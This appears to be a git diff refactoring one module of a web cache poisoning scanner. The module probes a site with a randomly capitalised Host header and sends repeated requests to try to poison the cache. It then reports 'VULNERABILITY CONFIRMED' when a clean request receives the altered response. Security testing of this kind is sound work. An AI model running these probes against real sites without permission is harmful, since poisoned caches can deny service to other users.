@@ -2,18 +2,21 @@
 # -*- coding: utf-8 -*-
 
 """
-Attempts to find Cache Poisoning with Host Header Case Normalization (HHCN)  
+Attempts to find Cache Poisoning with Host Header Case Normalization (HHCN)
 https://youst.in/posts/cache-key-normalization-denial-of-service/
 """
 
-from ..utils import *
+from modules.utils import random, requests, urlparse, configure_logger
+
+logger = configure_logger(__name__)
 
 VULN_NAME = "Host Header Case Normalization"
 
-def HHCN(url, s, authent):
-    behavior = False
+CONTENT_DELTA_RANGE = 50
 
-    # replace min char by maj char in the domain
+
+def random_domain_capitalization(url):
+    """Randomly capitalize characters from the url domain"""
     domain = urlparse(url).netloc
 
     index = random.randint(0, len(domain) - 3)
@@ -23,49 +26,92 @@ def HHCN(url, s, authent):
     else:
         letter = letter - 1
         letter = domain[index].upper()
-    domain = domain[:index] + letter + domain[index + 1:]
-
-    headers = {"Host": domain}
-
-    req_main = s.get(url, verify=False, timeout=10, auth=authent, allow_redirects=False)
-    req_len = len(req_main.content)
-
-    req_hhcn = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
-    req_hhcn_len = len(req_hhcn.content)
-
-    if req_hhcn_len not in range(req_len - 50, req_len + 50):
-        for rf in req_hhcn.headers:
-            if "cache" in rf.lower() or "age" in rf.lower():
-                behavior = "DIFFERENT RESPONSE LENGTH"
-                for x in range(0, 10):
-                    req_hhcn_bis = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
-                    #print(req_hhcn_bis)
-            else:
-                req_hhcn_bis = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
-
-        req_verify = s.get(url, verify=False, timeout=10, auth=authent)
-
-        if len(req_hhcn_bis.content) == len(req_verify.content):
-            print(f" \033[31m└── [VULNERABILITY CONFIRMED]\033[0m | HHCN | \033[34m{url}\033[0m | {behavior} {req_len}b <> {len(req_hhcn_bis.content)}b | PAYLOAD: {headers}")
-        else:
-            if behavior:
-                print(f" \033[33m└── [INTERESTING BEHAVIOR]\033[0m | HHCN | \033[34m{url}\033[0m | {behavior} {req_len}b <> {req_hhcn_len}b | PAYLOAD: {headers}")
-
-    if req_main.status_code != req_hhcn.status_code:
-        for rf in req_hhcn.headers:
-            if "cache" in rf.lower() or "age" in rf.lower():
-                behavior = "DIFFERENT STATUS-CODE"
-                for x in range(0, 10):
-                    req_hhcn_bis = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
-            else:
-                req_hhcn_bis = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
-
-        req_verify = s.get(url, verify=False, timeout=10, auth=authent)
-
-        if req_hhcn_bis.status_code == req_verify.status_code:
-            print(f" \033[31m└── [VULNERABILITY CONFIRMED]\033[0m | HHCN | \033[34m{url}\033[0m | {behavior} {req_main.status_code} <> {req_hhcn_bis.status_code} | PAYLOAD: {headers}")
-        else:
-            if behavior:
-                print(f" \033[33m└── [INTERESTING BEHAVIOR]\033[0m | HHCN | \033[34m{url}\033[0m | {behavior} {req_main.status_code} <> {req_hhcn.status_code} | PAYLOAD: {headers}")
+    domain = domain[:index] + letter + domain[index + 1 :]
+    return domain
 
 
+def HHCN(url, s, main_response, authent, content_delta_range=CONTENT_DELTA_RANGE):
+    """Attempts to find Cache Poisoning with Host Header Case Normalization"""
+
+    headers = {"Host": random_domain_capitalization(url)}
+    payload = f"PAYLOAD: {headers}"
+
+    try:
+        main_response_size = len(main_response.content)
+
+        probe = s.get(
+            url,
+            headers=headers,
+            verify=False,
+            timeout=10,
+            auth=authent,
+            allow_redirects=False,
+        )
+        probe_size = len(probe.content)
+        behavior = ""
+        if not (
+            main_response_size - content_delta_range
+            < probe_size
+            < main_response_size + content_delta_range
+        ) or (main_response.status_code != probe.status_code):
+            for rf in probe.headers:
+                if "cache" in rf.lower() or "age" in rf.lower():
+                    for _ in range(10):
+                        req_hhcn_bis = s.get(
+                            url,
+                            headers=headers,
+                            verify=False,
+                            timeout=10,
+                            auth=authent,
+                            allow_redirects=False,
+                        )
+                        # print(req_hhcn_bis)
+                        break  # ???
+                else:
+                    req_hhcn_bis = s.get(
+                        url,
+                        headers=headers,
+                        verify=False,
+                        timeout=10,
+                        auth=authent,
+                        allow_redirects=False,
+                    )
+
+            if not (
+                main_response_size - content_delta_range
+                < probe_size
+                < main_response_size + content_delta_range
+            ):
+                behavior = (
+                    f"DIFFERENT RESPONSE LENGTH | {main_response_size}b > {probe_size}b"
+                )
+                print(
+                    f" \033[33m└── [INTERESTING BEHAVIOR]\033[0m | HHCN | \033[34m{url}\033[0m | {behavior} | {payload}"
+                )
+
+            if main_response.status_code != probe.status_code:
+                behavior = (
+                    f"DIFFERENT STATUS-CODE | {main_response_size}b > {probe_size}b"
+                )
+                print(
+                    f" \033[33m└── [INTERESTING BEHAVIOR]\033[0m | HHCN | \033[34m{url}\033[0m | {behavior} | {payload}"
+                )
+
+            control = s.get(url, verify=False, timeout=10, auth=authent)
+
+            if behavior and len(req_hhcn_bis.content) == len(control.content):
+                behavior = f"DIFFERENT RESPONSE LENGTH | {main_response_size}b > {len(control.content)}b"
+                print(
+                    f" \033[31m└── [VULNERABILITY CONFIRMED]\033[0m | HHCN | \033[34m{url}\033[0m | {behavior} | {payload}"
+                )
+
+            if behavior and req_hhcn_bis.status_code == control.status_code:
+                behavior = f"DIFFERENT STATUS-CODE | {main_response.status_code} > {control.status_code}"
+                print(
+                    f" \033[31m└── [VULNERABILITY CONFIRMED]\033[0m | HHCN | \033[34m{url}\033[0m | {behavior} | {payload}"
+                )
+    except requests.exceptions.ConnectionError as e:
+        logger.exception(e)
+
+    print(f" \033[34m {headers}\033[0m\r", end="")
+    print("\033[K", end="")
